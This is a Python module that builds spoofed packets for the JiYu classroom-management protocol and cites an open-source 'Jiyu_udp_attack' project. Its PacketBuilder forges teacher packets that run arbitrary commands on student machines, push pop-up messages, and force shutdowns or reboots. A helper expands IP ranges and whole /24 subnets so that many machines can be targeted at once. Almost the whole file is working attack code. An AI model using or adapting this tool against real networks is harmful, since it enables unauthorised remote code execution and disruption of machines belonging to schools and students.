"""
极域电子教室协议层 - DMOC数据包构造

协议版本支持：
- V6版 (2016+)：DMOC包头，端口7000/7005/7006/4705，组播224.50.50.42
- V4.2版：KACA/MESS/LANT包头，端口4605/11144，组播224.60.60.42

参考来源：
- Jiyu_udp_attack 开源项目
- 博客园高嘉泽《极域反向伪装教师机IP》
- 深信服极域广播部署案例
- 闪星空间极域抓包数据
"""
import struct
import socket
import random
from typing import List, Optional


class PacketBuilder:
    """DMOC数据包构造器（V6版）"""

    # V6版包头签名
    MAGIC = b"DMOC"

    # V4.2版包头签名
    MAGIC_V4_KACA = b"KACA"  # 学生端注册/心跳
    MAGIC_V4_MESS = b"MESS"  # 消息包
    MAGIC_V4_LANT = b"LANT"  # LAN数据传输（屏幕等）

    # V6版命令类型
    CMD_EXEC = 0x036E       # 远程执行程序
    CMD_REBOOT = 0x022A     # 重启
    CMD_SHUTDOWN = 0x022A   # 关机
    CMD_MESSAGE = 0x039E    # 发送消息

    # V6版端口
    PORT_V6_HEARTBEAT = 7000    # 教师心跳/学生发现
    PORT_V6_EXEC = 4705          # 远程执行
    PORT_V6_SHUTDOWN = 7005     # 关机/重启/锁屏
    PORT_V6_MESSAGE = 7006      # 弹窗/签到
    PORT_V6_TCP_MONITOR = 7001   # 屏幕监控/文件下发（TCP）
    PORT_V6_TCP_CONTROL = 7003  # 远程控制（TCP）
    PORT_V6_AUDIO = 7002        # 语音对讲（UDP）

    # V4.2版端口
    PORT_V4_STUDENT_UDP = 2355     # 学生端UDP
    PORT_V4_TEACHER_UDP = 4605     # 教师端UDP
    PORT_V4_SCREEN_UDP = 2356      # 屏幕数据UDP
    PORT_V4_SCREEN_TEACHER = 11144 # 教师端屏幕端口
    PORT_V4_TCP = 2357              # 控制TCP

    # 组播地址
    MULTICAST_V6_DISCOVER = "224.50.50.42"   # V6发现
    MULTICAST_V6_CONTROL = "225.2.2.111"     # V6控制组
    MULTICAST_V6_BROADCAST = "225.2.2.11"    # V6屏幕广播
    MULTICAST_V4_DISCOVER = "224.60.60.42"   # V4发现
    MULTICAST_V4_BROADCAST = "225.2.13.1"    # V4屏幕广播

    @staticmethod
    def _encode_wide_string(text: str, max_len: int = 200) -> List[int]:
        """将字符串编码为UTF-16LE宽字符字节数组"""
        result = []
        for ch in text[:max_len]:
            code = ord(ch)
            if code > 0xFF:
                result.append(code & 0xFF)
                result.append((code >> 8) & 0xFF)
            else:
                result.append(code & 0xFF)
                result.append(0x00)
        return result

    @staticmethod
    def _random_session_id() -> bytes:
        """生成随机会话ID"""
        return bytes([random.randint(0, 0xFF) for _ in range(8)])

    def build_exec_packet(self, target_ip: str, command: str, params: str = "") -> bytes:
        """构造V6版远程执行命令包（906字节）"""
        packet = bytearray(906)

        packet[0:4] = self.MAGIC
        struct.pack_into("<H", packet, 4, 0x0001)
        struct.pack_into("<H", packet, 6, self.CMD_EXEC)
        packet[8:16] = self._random_session_id()
        struct.pack_into("<H", packet, 16, 0x4E20)

        ip_bytes = socket.inet_aton(target_ip)
        packet[18:22] = ip_bytes

        struct.pack_into("<H", packet, 22, 0x0391)
        struct.pack_into("<H", packet, 24, 0x0391)
        struct.pack_into("<H", packet, 26, 0x0008)
        struct.pack_into("<I", packet, 28, 0x00000000)
        struct.pack_into("<H", packet, 32, 0x0005)
        struct.pack_into("<H", packet, 34, 0x0000)
        packet[36] = 0x01

        cmd_bytes = self._encode_wide_string(command)
        for i, b in enumerate(cmd_bytes):
            if 56 + i < 576:
                packet[56 + i] = b

        if params:
            param_bytes = self._encode_wide_string(params)
            for i, b in enumerate(param_bytes):
                if 578 + i < 896:
                    packet[578 + i] = b

        packet[896] = 0x01
        packet[900] = 0x01
        return bytes(packet)

    def build_message_packet(self, target_ip: str, message: str) -> bytes:
        """构造V6版发送消息弹窗包"""
        packet = bytearray(906)

        packet[0:4] = self.MAGIC
        struct.pack_into("<H", packet, 4, 0x0001)
        struct.pack_into("<H", packet, 6, self.CMD_MESSAGE)
        packet[8:16] = self._random_session_id()
        struct.pack_into("<H", packet, 16, 0x4E20)

        ip_bytes = socket.inet_aton(target_ip)
        packet[18:22] = ip_bytes

        struct.pack_into("<H", packet, 22, 0x01D1)
        struct.pack_into("<H", packet, 24, 0x01D1)
        struct.pack_into("<H", packet, 26, 0x0002)
        struct.pack_into("<I", packet, 28, 0x00000000)

        msg_bytes = self._encode_wide_string(message, max_len=400)
        for i, b in enumerate(msg_bytes):
            if 56 + i < 896:
                packet[56 + i] = b

        return bytes(packet)

    def build_shutdown_packet(self, target_ip: str, reboot: bool = False) -> bytes:
        """构造V6版关机/重启包"""
        packet = bytearray(622)

        packet[0:4] = self.MAGIC
        struct.pack_into("<H", packet, 4, 0x0001)
        struct.pack_into("<H", packet, 6, self.CMD_SHUTDOWN)
        packet[8:16] = self._random_session_id()
        struct.pack_into("<H", packet, 16, 0x4E20)

        ip_bytes = socket.inet_aton(target_ip)
        packet[18:22] = ip_bytes

        struct.pack_into("<H", packet, 22, 0x021D)
        struct.pack_into("<H", packet, 24, 0x021D)
        struct.pack_into("<H", packet, 26, 0x0002)
        struct.pack_into("<I", packet, 28, 0x00000000)

        sub_cmd = 0x14 if reboot else 0x13
        struct.pack_into("<H", packet, 32, sub_cmd)
        struct.pack_into("<H", packet, 34, 0x000F)
        struct.pack_into("<H", packet, 36, 0x0010)
        packet[38] = 0x0F
        packet[40] = 0x01

        return bytes(packet)

    def build_heartbeat_packet(self) -> bytes:
        """构造V6版教师心跳包（UDP 7000）"""
        packet = bytearray(128)
        packet[0:4] = self.MAGIC
        struct.pack_into("<H", packet, 4, 0x0001)
        packet[8:16] = self._random_session_id()
        packet[20] = 0x01
        return bytes(packet)

    def build_v4_kaca_packet(self, student_ip: str) -> bytes:
        """构造V4.2版学生注册包（KACA头）"""
        packet = bytearray(36)
        packet[0:4] = self.MAGIC_V4_KACA
        struct.pack_into("<H", packet, 4, 0x0000)
        struct.pack_into("<H", packet, 6, 0x0100)
        struct.pack_into("<H", packet, 8, 0x0004)
        struct.pack_into("<I", packet, 12, random.randint(0, 0xFFFFFFFF))
        for i in range(16, 28):
            packet[i] = random.randint(0, 0xFF)
        packet[28:32] = socket.inet_aton(student_ip)
        return bytes(packet)


def parse_ip_range(ip_str: str) -> List[str]:
    """解析IP范围字符串"""
    ips = []
    if "-" in ip_str:
        parts = ip_str.split("-")
        base = parts[0].split(".")
        start = int(base[3])
        end = int(parts[1])
        if end > 254:
            end = 254
        for i in range(start, end + 1):
            base[3] = str(i)
            ips.append(".".join(base))
    elif "/24" in ip_str:
        base = ip_str.replace("/24", "").split(".")
        for i in range(1, 255):
            base[3] = str(i)
            ips.append(".".join(base))
    else:
        ips.append(ip_str)
    return ips
